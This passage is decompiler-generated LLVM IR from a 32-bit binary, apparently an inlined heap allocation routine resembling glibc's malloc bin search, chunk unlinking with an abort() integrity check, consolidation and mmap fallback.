  %v3_8052fc1 = load i32, i32* %v2_8052fc1, align 4
  store i32 %v3_8052fc1, i32* %ecx.global-to-local, align 4
  store i32 %v3_8052fc1, i32* %ebx.global-to-local, align 4
  %v2_8052fcc = add i32 %v3_8052fc1, 4
  %v3_8052fcc = inttoptr i32 %v2_8052fcc to i32*
  %v4_8052fcc = load i32, i32* %v3_8052fcc, align 4
  %v10_8052fcc = icmp ult i32 %v1_8052fb8, %v4_8052fcc
  br i1 %v10_8052fcc, label %dec_label_pc_8052fbd, label %dec_label_pc_8052fd1

dec_label_pc_8052fd1:                             ; preds = %dec_label_pc_8052fbd, %dec_label_pc_8052fb6
  %v0_8052fd1.lcssa = phi i32 [ %v3_8052f9b, %dec_label_pc_8052fb6 ], [ %v3_8052fc1, %dec_label_pc_8052fbd ]
  %v1_8052fd1 = add i32 %v0_8052fd1.lcssa, 12
  %v2_8052fd1 = inttoptr i32 %v1_8052fd1 to i32*
  %v3_8052fd1 = load i32, i32* %v2_8052fd1, align 4
  store i32 %v3_8052fd1, i32* @ebx, align 4
  br label %dec_label_pc_8052fd4

dec_label_pc_8052fd4:                             ; preds = %dec_label_pc_8052f7a, %dec_label_pc_8052fa8, %dec_label_pc_8052f8b, %dec_label_pc_8052fd1
  %v0_8052fd4 = phi i32 [ %v0_8052f8d, %dec_label_pc_8052f8b ], [ %v0_8052f8d, %dec_label_pc_8052fd1 ], [ %v0_8052f8d, %dec_label_pc_8052fa8 ], [ %v2_8052f7c, %dec_label_pc_8052f7a ]
  %stack_var_-64.1 = phi i32 [ %v2_8052f94, %dec_label_pc_8052f8b ], [ %v0_8052fd1.lcssa, %dec_label_pc_8052fd1 ], [ %v2_8052f94, %dec_label_pc_8052fa8 ], [ %v3_8052f86, %dec_label_pc_8052f7a ]
  %v1_8052fd6 = urem i32 %v0_8052fd4, 32
  %v2_8052fd6 = icmp eq i32 %v1_8052fd6, 0
  store i32 %v1_8052fd6, i32* %esi.global-to-local, align 4
  store i32 %v1_8052fd6, i32* @ecx, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_8052fe0 = sdiv i32 %v0_8052fd4, 32
  store i32 %v2_8052fe0, i32* %edx.global-to-local, align 4
  br i1 %v2_8052fd6, label %bb84, label %bb

bb:                                               ; preds = %dec_label_pc_8052fd4
  %v5_8052fe3 = shl i32 1, %v1_8052fd6
  store i32 %v5_8052fe3, i32* %eax.global-to-local, align 4
  br label %bb84

bb84:                                             ; preds = %dec_label_pc_8052fd4, %bb
  %v5_8052fe5 = phi i32 [ 1, %dec_label_pc_8052fd4 ], [ %v5_8052fe3, %bb ]
  %v1_8052fe5 = mul nsw i32 %v2_8052fe0, 4
  %v2_8052fe5 = add i32 %v1_8052fe5, ptrtoint (i32* @global_var_8061b74.507 to i32)
  %v3_8052fe5 = inttoptr i32 %v2_8052fe5 to i32*
  %v4_8052fe5 = load i32, i32* %v3_8052fe5, align 4
  %v6_8052fe5 = or i32 %v4_8052fe5, %v5_8052fe5
  store i32 %v6_8052fe5, i32* %v3_8052fe5, align 4
  %v0_8052fec = load i32, i32* @ebx, align 4
  %v1_8052fec = load i32, i32* @ebp, align 4
  %v2_8052fec = add i32 %v1_8052fec, 12
  %v3_8052fec = inttoptr i32 %v2_8052fec to i32*
  store i32 %v0_8052fec, i32* %v3_8052fec, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_8052ff3 = load i32, i32* @ebp, align 4
  %v2_8052ff3 = add i32 %v1_8052ff3, 8
  %v3_8052ff3 = inttoptr i32 %v2_8052ff3 to i32*
  store i32 %stack_var_-64.1, i32* %v3_8052ff3, align 4
  %v0_8052ff6 = load i32, i32* @ebp, align 4
  %v1_8052ff6 = load i32, i32* @ebx, align 4
  %v2_8052ff6 = add i32 %v1_8052ff6, 8
  %v3_8052ff6 = inttoptr i32 %v2_8052ff6 to i32*
  store i32 %v0_8052ff6, i32* %v3_8052ff6, align 4
  %v0_8052ff9 = load i32, i32* @ebp, align 4
  %v1_8052ff9 = load i32, i32* @esi, align 4
  %v2_8052ff9 = add i32 %v1_8052ff9, 12
  %v3_8052ff9 = inttoptr i32 %v2_8052ff9 to i32*
  store i32 %v0_8052ff9, i32* %v3_8052ff9, align 4
  %v0_8052ffc = load i32, i32* @global_var_8061880.506, align 128
  store i32 %v0_8052ffc, i32* @ebp, align 4
  %v9_8053002 = icmp eq i32 %v0_8052ffc, 134617204
  %v1_8053008 = icmp eq i1 %v9_8053002, false
  br i1 %v1_8053008, label %dec_label_pc_8052f2b, label %dec_label_pc_805300e

dec_label_pc_805300e:                             ; preds = %bb84, %dec_label_pc_8052ffc.preheader
  br i1 %v8_8052ebf, label %dec_label_pc_805309c, label %dec_label_pc_805301c

dec_label_pc_805301c:                             ; preds = %dec_label_pc_805300e
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_8053020 = mul i32 %stack_var_-40.0.ph, 8
  %v2_8053020 = add i32 %v1_8053020, ptrtoint (i32* @global_var_806186c.503 to i32)
  store i32 %v2_8053020, i32* %edx.global-to-local, align 4
  %v1_8053027 = add i32 %v1_8053020, add (i32 ptrtoint (i32* @global_var_806186c.503 to i32), i32 12)
  %v2_8053027 = inttoptr i32 %v1_8053027 to i32*
  %storemerge1.pre = load i32, i32* %v2_8053027, align 4
  br label %dec_label_pc_8053098

dec_label_pc_805302c:                             ; preds = %dec_label_pc_8053098
  %v1_805302c = add i32 %v4_8053043, 4
  %v2_805302c = inttoptr i32 %v1_805302c to i32*
  %v3_805302c = load i32, i32* %v2_805302c, align 4
  store i32 %v3_805302c, i32* %ebx.global-to-local, align 4
  %v1_805302f = add i32 %v4_8053043, 12
  %v2_805302f = inttoptr i32 %v1_805302f to i32*
  %v3_805302f = load i32, i32* %v2_805302f, align 4
  store i32 %v3_805302f, i32* @ecx, align 4
  %v1_8053032 = and i32 %v3_805302c, -4
  store i32 %v1_8053032, i32* @ebx, align 4
  %v10_8053035 = icmp ult i32 %v1_8053032, %v1_805320e
  br i1 %v10_8053035, label %dec_label_pc_8053098, label %dec_label_pc_805303b

dec_label_pc_805303b:                             ; preds = %dec_label_pc_805302c
  %v1_805303b = add i32 %v4_8053043, 8
  %v2_805303b = inttoptr i32 %v1_805303b to i32*
  %v3_805303b = load i32, i32* %v2_805303b, align 4
  store i32 %v3_805303b, i32* @edx, align 4
  %v1_805303e = add i32 %v3_805303b, 12
  %v2_805303e = inttoptr i32 %v1_805303e to i32*
  %v3_805303e = load i32, i32* %v2_805303e, align 4
  %v15_805303e = icmp eq i32 %v3_805303e, %v4_8053043
  %v1_8053041 = icmp eq i1 %v15_805303e, false
  br i1 %v1_8053041, label %dec_label_pc_8053048, label %dec_label_pc_8053043

dec_label_pc_8053043:                             ; preds = %dec_label_pc_805303b
  %v1_8053043 = add i32 %v3_805302f, 8
  %v2_8053043 = inttoptr i32 %v1_8053043 to i32*
  %v3_8053043 = load i32, i32* %v2_8053043, align 4
  %v15_8053043 = icmp eq i32 %v3_8053043, %v4_8053043
  br i1 %v15_8053043, label %dec_label_pc_805304d, label %dec_label_pc_8053048

dec_label_pc_8053048:                             ; preds = %dec_label_pc_8053043, %dec_label_pc_805303b
  %v0_8053048 = call i32 @abort()
  store i32 %v0_8053048, i32* %eax.global-to-local, align 4
  %v0_805304d.pre = load i32, i32* @ebx, align 4
  %v0_8053053.pre = load i32, i32* @ecx, align 4
  %v1_8053053.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805304d

dec_label_pc_805304d:                             ; preds = %dec_label_pc_8053043, %dec_label_pc_8053048
  %v1_8053053 = phi i32 [ %v3_805303b, %dec_label_pc_8053043 ], [ %v1_8053053.pre, %dec_label_pc_8053048 ]
  %v0_8053053 = phi i32 [ %v3_805302f, %dec_label_pc_8053043 ], [ %v0_8053053.pre, %dec_label_pc_8053048 ]
  %v0_805304d = phi i32 [ %v1_8053032, %dec_label_pc_8053043 ], [ %v0_805304d.pre, %dec_label_pc_8053048 ]
  %v5_805304f = sub i32 %v0_805304d, %v1_805320e
  store i32 %v5_805304f, i32* %esi.global-to-local, align 4
  %v2_8053053 = add i32 %v1_8053053, 12
  %v3_8053053 = inttoptr i32 %v2_8053053 to i32*
  store i32 %v0_8053053, i32* %v3_8053053, align 4
  %v0_8053056 = load i32, i32* @edx, align 4
  %v1_8053056 = load i32, i32* @ecx, align 4
  %v2_8053056 = add i32 %v1_8053056, 8
  %v3_8053056 = inttoptr i32 %v2_8053056 to i32*
  store i32 %v0_8053056, i32* %v3_8053056, align 4
  %v0_8053059 = load i32, i32* %esi.global-to-local, align 4
  %v0_805305c = load i32, i32* %eax.global-to-local, align 4
  %v1_805305c = add i32 %v0_805305c, 8
  store i32 %v1_805305c, i32* @ecx, align 4
  %tmp127 = icmp ult i32 %v0_8053059, 16
  br i1 %tmp127, label %dec_label_pc_805355d, label %dec_label_pc_8053065

dec_label_pc_8053065:                             ; preds = %dec_label_pc_805304d
  %v2_8053069 = add i32 %v0_805305c, %v1_805320e
  store i32 %v2_8053069, i32* @edx, align 4
  %v1_805306c = or i32 %v1_805320e, 1
  store i32 %v1_805306c, i32* %ebx.global-to-local, align 4
  %v2_805306f = add i32 %v0_805305c, 4
  %v3_805306f = inttoptr i32 %v2_805306f to i32*
  store i32 %v1_805306c, i32* %v3_805306f, align 4
  %v0_8053072 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053074 = or i32 %v0_8053072, 1
  store i32 %v1_8053074, i32* %eax.global-to-local, align 4
  %v0_8053077 = load i32, i32* @edx, align 4
  %v1_8053077 = load i32, i32* @ebp, align 4
  %v2_8053077 = add i32 %v1_8053077, 8
  %v3_8053077 = inttoptr i32 %v2_8053077 to i32*
  store i32 %v0_8053077, i32* %v3_8053077, align 4
  %v0_805307a = load i32, i32* @edx, align 4
  %v1_805307a = load i32, i32* @ebp, align 4
  %v2_805307a = add i32 %v1_805307a, 12
  %v3_805307a = inttoptr i32 %v2_805307a to i32*
  store i32 %v0_805307a, i32* %v3_805307a, align 4
  %v0_805307d = load i32, i32* @edx, align 4
  %v1_805307d = add i32 %v0_805307d, 8
  %v2_805307d = inttoptr i32 %v1_805307d to i32*
  store i32 ptrtoint (i32* @global_var_8061874.505 to i32), i32* %v2_805307d, align 4
  %v0_8053084 = load i32, i32* @edx, align 4
  %v1_8053084 = add i32 %v0_8053084, 12
  %v2_8053084 = inttoptr i32 %v1_8053084 to i32*
  store i32 ptrtoint (i32* @global_var_8061874.505 to i32), i32* %v2_8053084, align 4
  %v0_805308b = load i32, i32* %eax.global-to-local, align 4
  %v1_805308b = load i32, i32* @edx, align 4
  %v2_805308b = add i32 %v1_805308b, 4
  %v3_805308b = inttoptr i32 %v2_805308b to i32*
  store i32 %v0_805308b, i32* %v3_805308b, align 4
  %v0_805308e = load i32, i32* %esi.global-to-local, align 4
  %v1_805308e = load i32, i32* @edx, align 4
  %v3_805308e = add i32 %v1_805308e, %v0_805308e
  %v4_805308e = inttoptr i32 %v3_805308e to i32*
  store i32 %v0_805308e, i32* %v4_805308e, align 4
  br label %dec_label_pc_8053562

dec_label_pc_8053098:                             ; preds = %dec_label_pc_805302c, %dec_label_pc_805301c
  %v4_8053043 = phi i32 [ %storemerge1.pre, %dec_label_pc_805301c ], [ %v3_805302f, %dec_label_pc_805302c ]
  store i32 %v4_8053043, i32* %eax.global-to-local, align 4
  %v12_8053098 = icmp eq i32 %v4_8053043, %v2_8053020
  %v1_805309a = icmp eq i1 %v12_8053098, false
  br i1 %v1_805309a, label %dec_label_pc_805302c, label %dec_label_pc_805309c.loopexit

dec_label_pc_805309c.loopexit:                    ; preds = %dec_label_pc_8053098
  br label %dec_label_pc_805309c

dec_label_pc_805309c:                             ; preds = %dec_label_pc_805309c.loopexit, %dec_label_pc_805300e
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_80530a5 = add i32 %stack_var_-40.0.ph, 1
  %v2_80530a8 = udiv i32 %v1_80530a5, 32
  store i32 %v2_80530a8, i32* @edi, align 4
  %v1_80530ab = mul i32 %v1_80530a5, 8
  %v2_80530ab = add i32 %v1_80530ab, ptrtoint (i32* @global_var_806186c.503 to i32)
  store i32 %v2_80530ab, i32* %ebx.global-to-local, align 4
  %v1_80530b2 = urem i32 %v1_80530a5, 32
  %v2_80530b2 = icmp eq i32 %v1_80530b2, 0
  store i32 %v1_80530b2, i32* %ecx.global-to-local, align 4
  %v1_80530b5 = mul nuw nsw i32 %v2_80530a8, 4
  %v2_80530b5 = add i32 %v1_80530b5, ptrtoint (i32* @global_var_8061b74.507 to i32)
  %v3_80530b5 = inttoptr i32 %v2_80530b5 to i32*
  %v4_80530b5 = load i32, i32* %v3_80530b5, align 4
  store i32 %v4_80530b5, i32* %edx.global-to-local, align 4
  br i1 %v2_80530b2, label %.preheader, label %bb85

bb85:                                             ; preds = %dec_label_pc_805309c
  %v5_80530bc = shl i32 1, %v1_80530b2
  store i32 %v5_80530bc, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_805309c, %bb85, %dec_label_pc_80530fd
  %v1_80530be = phi i32 [ %v1_80530be.pre, %dec_label_pc_80530fd ], [ %v4_80530b5, %bb85 ], [ %v4_80530b5, %dec_label_pc_805309c ]
  %v0_80530c2 = phi i32 [ %v0_80530be.pre, %dec_label_pc_80530fd ], [ %v5_80530bc, %bb85 ], [ 1, %dec_label_pc_805309c ]
  %tmp86 = icmp ule i32 %v0_80530c2, %v1_80530be
  %v1_80530c2 = icmp eq i32 %v0_80530c2, 0
  %v1_80530c4 = icmp eq i1 %v1_80530c2, false
  %or.cond = and i1 %tmp86, %v1_80530c4
  br i1 %or.cond, label %dec_label_pc_80530c2.dec_label_pc_80530f2.preheader_crit_edge, label %dec_label_pc_80530c6.preheader

dec_label_pc_80530c2.dec_label_pc_80530f2.preheader_crit_edge: ; preds = %.preheader
  %v0_80530ed12.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80530f2.preheader

dec_label_pc_80530c6.preheader:                   ; preds = %.preheader
  %v0_80530c6.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80530c6

dec_label_pc_80530c6:                             ; preds = %dec_label_pc_80530c6.preheader, %dec_label_pc_80530d0
  %v0_80530c6 = phi i32 [ %v0_80530c6.pre, %dec_label_pc_80530c6.preheader ], [ %v1_80530c6, %dec_label_pc_80530d0 ]
  %v1_80530c6 = add i32 %v0_80530c6, 1
  store i32 %v1_80530c6, i32* @edi, align 4
  %v6_80530ca = icmp ugt i32 %v1_80530c6, 2
  br i1 %v6_80530ca, label %dec_label_pc_8053179.loopexit, label %dec_label_pc_80530d0

dec_label_pc_80530d0:                             ; preds = %dec_label_pc_80530c6
  %v1_80530d0 = mul i32 %v1_80530c6, 4
  %v2_80530d0 = add i32 %v1_80530d0, ptrtoint (i32* @global_var_8061b74.507 to i32)
  %v3_80530d0 = inttoptr i32 %v2_80530d0 to i32*
  %v4_80530d0 = load i32, i32* %v3_80530d0, align 4
  store i32 %v4_80530d0, i32* %edx.global-to-local, align 4
  %v1_80530d7 = icmp eq i32 %v4_80530d0, 0
  br i1 %v1_80530d7, label %dec_label_pc_80530c6, label %dec_label_pc_80530db

dec_label_pc_80530db:                             ; preds = %dec_label_pc_80530d0
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_80530e2 = mul i32 %v1_80530c6, 256
  store i32 %v2_80530e2, i32* %eax.global-to-local, align 4
  %v1_80530e5 = add i32 %v2_80530e2, ptrtoint (i32* @global_var_806186c.503 to i32)
  store i32 %v1_80530e5, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80530f2.preheader

dec_label_pc_80530f2.preheader:                   ; preds = %dec_label_pc_80530c2.dec_label_pc_80530f2.preheader_crit_edge, %dec_label_pc_80530db
  %v0_80530ed12 = phi i32 [ %v1_80530e5, %dec_label_pc_80530db ], [ %v0_80530ed12.pre, %dec_label_pc_80530c2.dec_label_pc_80530f2.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_80530db ], [ %v0_80530c2, %dec_label_pc_80530c2.dec_label_pc_80530f2.preheader_crit_edge ]
  %v0_8053104 = phi i32 [ %v4_80530d0, %dec_label_pc_80530db ], [ %v1_80530be, %dec_label_pc_80530c2.dec_label_pc_80530f2.preheader_crit_edge ]
  %v2_80530f24 = and i32 %v0_8053104, %esi.promoted
  %v3_80530f25 = icmp eq i32 %v2_80530f24, 0
  br i1 %v3_80530f25, label %dec_label_pc_80530ed, label %dec_label_pc_80530f6

dec_label_pc_80530ed:                             ; preds = %dec_label_pc_80530f2.preheader, %dec_label_pc_80530ed
  %v2_80530f014 = phi i32 [ %v2_80530f0, %dec_label_pc_80530ed ], [ %esi.promoted, %dec_label_pc_80530f2.preheader ]
  %v0_80530ed13 = phi i32 [ %v1_80530ed, %dec_label_pc_80530ed ], [ %v0_80530ed12, %dec_label_pc_80530f2.preheader ]
  %v1_80530ed = add i32 %v0_80530ed13, 8
  %v2_80530f0 = mul i32 %v2_80530f014, 2
  %v2_80530f2 = and i32 %v2_80530f0, %v0_8053104
  %v3_80530f2 = icmp eq i32 %v2_80530f2, 0
  br i1 %v3_80530f2, label %dec_label_pc_80530ed, label %dec_label_pc_80530f2.dec_label_pc_80530f6_crit_edge

dec_label_pc_80530f2.dec_label_pc_80530f6_crit_edge: ; preds = %dec_label_pc_80530ed
  store i32 %v1_80530ed, i32* %ebx.global-to-local, align 4
  store i32 %v2_80530f0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80530f6

dec_label_pc_80530f6:                             ; preds = %dec_label_pc_80530f2.dec_label_pc_80530f6_crit_edge, %dec_label_pc_80530f2.preheader
  %v0_8053106 = phi i32 [ %v2_80530f0, %dec_label_pc_80530f2.dec_label_pc_80530f6_crit_edge ], [ %esi.promoted, %dec_label_pc_80530f2.preheader ]
  %v1_8053120 = phi i32 [ %v1_80530ed, %dec_label_pc_80530f2.dec_label_pc_80530f6_crit_edge ], [ %v0_80530ed12, %dec_label_pc_80530f2.preheader ]
  %v1_80530f6 = add i32 %v1_8053120, 12
  %v2_80530f6 = inttoptr i32 %v1_80530f6 to i32*
  %v3_80530f6 = load i32, i32* %v2_80530f6, align 4
  store i32 %v3_80530f6, i32* @ecx, align 4
  %v12_80530f9 = icmp eq i32 %v3_80530f6, %v1_8053120
  %v1_80530fb = icmp eq i1 %v12_80530f9, false
  br i1 %v1_80530fb, label %dec_label_pc_8053111, label %dec_label_pc_80530fd

dec_label_pc_80530fd:                             ; preds = %dec_label_pc_80530f6
  %v1_80530ff = add i32 %v3_80530f6, 8
  store i32 %v1_80530ff, i32* %ebx.global-to-local, align 4
  %v1_8053102 = sub i32 -1, %v0_8053106
  store i32 %v1_8053102, i32* %eax.global-to-local, align 4
  %v2_8053104 = and i32 %v0_8053104, %v1_8053102
  store i32 %v2_8053104, i32* %edx.global-to-local, align 4
  %v2_8053106 = mul i32 %v0_8053106, 2
  store i32 %v2_8053106, i32* %esi.global-to-local, align 4
  %v1_8053108 = load i32, i32* @edi, align 4
  %v2_8053108 = mul i32 %v1_8053108, 4
  %v3_8053108 = add i32 %v2_8053108, ptrtoint (i32* @global_var_8061b74.507 to i32)
  %v4_8053108 = inttoptr i32 %v3_8053108 to i32*
  store i32 %v2_8053104, i32* %v4_8053108, align 4
  %v0_80530be.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_80530be.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_8053111:                             ; preds = %dec_label_pc_80530f6
  %v1_8053111 = add i32 %v3_80530f6, 4
  %v2_8053111 = inttoptr i32 %v1_8053111 to i32*
  %v3_8053111 = load i32, i32* %v2_8053111, align 4
  store i32 %v3_8053111, i32* %edx.global-to-local, align 4
  %v1_8053114 = add i32 %v3_80530f6, 12
  %v2_8053114 = inttoptr i32 %v1_8053114 to i32*
  %v3_8053114 = load i32, i32* %v2_8053114, align 4
  store i32 %v3_8053114, i32* %eax.global-to-local, align 4
  %v1_8053117 = and i32 %v3_8053111, -4
  store i32 %v1_8053117, i32* @edx, align 4
  %v5_805311c = sub i32 %v1_8053117, %v1_805320e
  store i32 %v5_805311c, i32* %esi.global-to-local, align 4
  store i32 %v3_8053114, i32* %v2_80530f6, align 4
  %v0_8053123 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053123 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053123 = add i32 %v1_8053123, 8
  %v3_8053123 = inttoptr i32 %v2_8053123 to i32*
  store i32 %v0_8053123, i32* %v3_8053123, align 4
  %v0_8053126 = load i32, i32* %esi.global-to-local, align 4
  %tmp128 = icmp ult i32 %v0_8053126, 16
  br i1 %tmp128, label %dec_label_pc_805312b, label %dec_label_pc_8053132

dec_label_pc_805312b:                             ; preds = %dec_label_pc_8053111
  %v0_805312b = load i32, i32* @ecx, align 4
  %v1_805312b = load i32, i32* @edx, align 4
  %v2_805312b = add i32 %v0_805312b, 4
  %v3_805312b = add i32 %v2_805312b, %v1_805312b
  %v4_805312b = inttoptr i32 %v3_805312b to i32*
  %v5_805312b = load i32, i32* %v4_805312b, align 4
  %v6_805312b = or i32 %v5_805312b, 1
  store i32 %v6_805312b, i32* %v4_805312b, align 4
  br label %dec_label_pc_8053171

dec_label_pc_8053132:                             ; preds = %dec_label_pc_8053111
  store i32 %v1_805320e, i32* %eax.global-to-local, align 4
  %v0_805313b = load i32, i32* @ecx, align 4
  %v2_805313b = add i32 %v0_805313b, %v1_805320e
  store i32 %v2_805313b, i32* @edx, align 4
  %v1_805313e = load i32, i32* @ebp, align 4
  %v2_805313e = add i32 %v1_805313e, 8
  %v3_805313e = inttoptr i32 %v2_805313e to i32*
  store i32 %v2_805313b, i32* %v3_805313e, align 4
  %v0_8053141 = load i32, i32* @edx, align 4
  %v1_8053141 = load i32, i32* @ebp, align 4
  %v2_8053141 = add i32 %v1_8053141, 12
  %v3_8053141 = inttoptr i32 %v2_8053141 to i32*
  store i32 %v0_8053141, i32* %v3_8053141, align 4
  %v0_8053144 = load i32, i32* @edx, align 4
  %v1_8053144 = add i32 %v0_8053144, 8
  %v2_8053144 = inttoptr i32 %v1_8053144 to i32*
  store i32 ptrtoint (i32* @global_var_8061874.505 to i32), i32* %v2_8053144, align 4
  %v0_805314b = load i32, i32* @edx, align 4
  %v1_805314b = add i32 %v0_805314b, 12
  %v2_805314b = inttoptr i32 %v1_805314b to i32*
  store i32 ptrtoint (i32* @global_var_8061874.505 to i32), i32* %v2_805314b, align 4
  br i1 %v6_8052ec7, label %dec_label_pc_805315a, label %dec_label_pc_8053154

dec_label_pc_8053154:                             ; preds = %dec_label_pc_8053132
  %v0_8053154 = load i32, i32* @edx, align 4
  store i32 %v0_8053154, i32* @global_var_8061870.504, align 16
  br label %dec_label_pc_805315a

dec_label_pc_805315a:                             ; preds = %dec_label_pc_8053132, %dec_label_pc_8053154
  %v4_805315a = or i32 %v1_805320e, 1
  %v0_805315f = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_805315a, i32* %ebx.global-to-local, align 4
  %v1_8053165 = or i32 %v0_805315f, 1
  store i32 %v1_8053165, i32* %eax.global-to-local, align 4
  %v1_8053168 = load i32, i32* @ecx, align 4
  %v2_8053168 = add i32 %v1_8053168, 4
  %v3_8053168 = inttoptr i32 %v2_8053168 to i32*
  store i32 %v4_805315a, i32* %v3_8053168, align 4
  %v0_805316b = load i32, i32* %esi.global-to-local, align 4
  %v1_805316b = load i32, i32* @edx, align 4
  %v3_805316b = add i32 %v1_805316b, %v0_805316b
  %v4_805316b = inttoptr i32 %v3_805316b to i32*
  store i32 %v0_805316b, i32* %v4_805316b, align 4
  %v0_805316e = load i32, i32* %eax.global-to-local, align 4
  %v1_805316e = load i32, i32* @edx, align 4
  %v2_805316e = add i32 %v1_805316e, 4
  %v3_805316e = inttoptr i32 %v2_805316e to i32*
  store i32 %v0_805316e, i32* %v3_805316e, align 4
  br label %dec_label_pc_8053171

dec_label_pc_8053171:                             ; preds = %dec_label_pc_805312b, %dec_label_pc_805315a
  %v0_8053171 = load i32, i32* @ecx, align 4
  %v1_8053171 = add i32 %v0_8053171, 8
  store i32 %v1_8053171, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053573

dec_label_pc_8053179.loopexit:                    ; preds = %dec_label_pc_80530c6
  br label %dec_label_pc_8053179

dec_label_pc_8053179:                             ; preds = %dec_label_pc_8053179.loopexit, %dec_label_pc_8052e81, %dec_label_pc_8052e89
  %v0_8053179 = load i32, i32* @global_var_806186c.503, align 4
  store i32 %v0_8053179, i32* @ebx, align 4
  %v1_8053183 = add i32 %v1_805320e, 16
  store i32 %v1_8053183, i32* @esi, align 4
  %v1_8053186 = add i32 %v0_8053179, 4
  %v2_8053186 = inttoptr i32 %v1_8053186 to i32*
  %v3_8053186 = load i32, i32* %v2_8053186, align 4
  %v1_805318d = and i32 %v3_8053186, -4
  store i32 %v1_805318d, i32* %ecx.global-to-local, align 4
  %v7_8053190 = icmp ult i32 %v1_805318d, %v1_8053183
  br i1 %v7_8053190, label %dec_label_pc_80531b0, label %dec_label_pc_8053194

dec_label_pc_8053194:                             ; preds = %dec_label_pc_8053179
  %v2_8053198 = add i32 %v0_8053179, %v1_805320e
  store i32 %v2_8053198, i32* @edx, align 4
  %v1_805319b = or i32 %v1_805320e, 1
  store i32 %v1_805319b, i32* %eax.global-to-local, align 4
  store i32 %v2_8053198, i32* @global_var_806186c.503, align 4
  store i32 %v1_805319b, i32* %v2_8053186, align 4
  %v0_80531a7 = load i32, i32* %ecx.global-to-local, align 4
  %v5_80531a7 = sub i32 %v0_80531a7, %v1_805320e
  store i32 %v5_80531a7, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8053503

dec_label_pc_80531b0:                             ; preds = %dec_label_pc_8053179
  %v0_80531b0 = load i32, i32* @global_var_8061b9c.508, align 4
  store i32 %v0_80531b0, i32* %edx.global-to-local, align 4
  %v0_80531b6 = load i8, i8* @global_var_8061840.502, align 64
  %v1_80531b6 = and i8 %v0_80531b6, 2
  %v2_80531b6 = icmp eq i8 %v1_80531b6, 0
  br i1 %v2_80531b6, label %dec_label_pc_80531e4, label %dec_label_pc_80531bf

dec_label_pc_80531bf:                             ; preds = %dec_label_pc_80531b0
  store i32 ptrtoint (i8* @global_var_8061840.502 to i32), i32* %stack_var_-92, align 4
  %v2_80531c7 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8061840.502 to i32*))
  store i32 ptrtoint (i8* @global_var_8061840.502 to i32), i32* @ebx, align 4
  %v1_80531d1 = add i32 %v1_805320e, -7
  store i32 %v1_80531d1, i32* %eax.global-to-local, align 4
  store i32 %v1_80531d1, i32* %stack_var_-92, align 4
  %v1_80531d5 = call i32 @malloc(i32 %v1_80531d1)
  store i32 %v1_80531d5, i32* %eax.global-to-local, align 4
  store i32 %v1_80531d5, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053573

dec_label_pc_80531e4:                             ; preds = %dec_label_pc_80531b0
  %v1_80531e4 = add i32 %v0_80531b0, -1
  store i32 %v1_80531e4, i32* @ecx, align 4
  store i32 %v1_805320e, i32* @ebx, align 4
  %v1_80531ef = load i32, i32* @global_var_8061b8c.509, align 4
  %v7_80531ef = icmp ult i32 %v1_805320e, %v1_80531ef
  br i1 %v7_80531ef, label %dec_label_pc_80532b1, label %dec_label_pc_80531fb

dec_label_pc_80531fb:                             ; preds = %dec_label_pc_80531e4
  %v0_80531fb = load i32, i32* @global_var_8061b90.510, align 16
  store i32 %v0_80531fb, i32* %eax.global-to-local, align 4
  %v1_8053200 = load i32, i32* @global_var_8061b94.511, align 4
  %v5_8053206 = icmp slt i32 %v0_80531fb, %v1_8053200
  br i1 %v5_8053206, label %dec_label_pc_805320c, label %dec_label_pc_80532b1

dec_label_pc_805320c:                             ; preds = %dec_label_pc_80531fb
  %v2_805320e = add i32 %v1_805320e, 10
  %v3_805320e = add i32 %v2_805320e, %v0_80531b0
  %v1_8053212 = sub i32 0, %v0_80531b0
  store i32 %v1_8053212, i32* %eax.global-to-local, align 4
  %v2_8053214 = and i32 %v3_805320e, %v1_8053212
  store i32 %v2_8053214, i32* @ebx, align 4
  %tmp129 = icmp ugt i32 %v2_8053214, %v1_805320e
  br i1 %tmp129, label %dec_label_pc_8053220, label %dec_label_pc_80532b1

dec_label_pc_8053220:                             ; preds = %dec_label_pc_805320c
  store i32 0, i32* %stack_var_-92, align 4
  %v8_805322d = call i32 @mmap(i32 0, i32 %v2_8053214, i32 3, i32 34, i32 0, i32 0, i32 %v1_80531e4, i32 %v1_80531e4)
  store i32 %v8_805322d, i32* %eax.global-to-local, align 4
  store i32 %v8_805322d, i32* @edx, align 4
  %v10_8053237 = icmp eq i32 %v8_805322d, -1
  br i1 %v10_8053237, label %dec_label_pc_8053220.dec_label_pc_80532b1_crit_edge, label %dec_label_pc_805323c

dec_label_pc_8053220.dec_label_pc_80532b1_crit_edge: ; preds = %dec_label_pc_8053220
  %v0_80532b1.pre = load i32, i32* @global_var_806186c.503, align 4
  br label %dec_label_pc_80532b1

dec_label_pc_805323c:                             ; preds = %dec_label_pc_8053220
  %v1_805323e = urem i32 %v8_805322d, 8
  %v2_805323e = icmp eq i32 %v1_805323e, 0
  store i32 %v1_805323e, i32* @ecx, align 4
  br i1 %v2_805323e, label %dec_label_pc_8053256, label %dec_label_pc_8053243

dec_label_pc_8053243:                             ; preds = %dec_label_pc_805323c
  %v0_8053248 = load i32, i32* @ebx, align 4
  %v2_805324a = sub nsw i32 8, %v1_805323e
  store i32 %v2_805324a, i32* %eax.global-to-local, align 4
  %v2_805324c = add i32 %v2_805324a, %v8_805322d
